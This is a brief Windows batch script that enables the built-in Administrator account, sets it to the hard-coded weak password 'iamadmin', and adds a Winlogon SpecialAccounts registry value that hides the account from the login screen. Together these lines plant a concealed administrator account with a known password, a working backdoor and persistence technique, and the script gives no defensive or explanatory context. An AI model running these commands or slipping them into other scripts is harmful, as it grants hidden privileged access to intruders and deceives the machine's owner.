:: Enable the built-in Administrator account
net user Administrator /active:yes

:: Set its password
net user Administrator "iamadmin"

:: Hide Administrator from the login screen
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Administrator /t REG_DWORD /d 0 /f
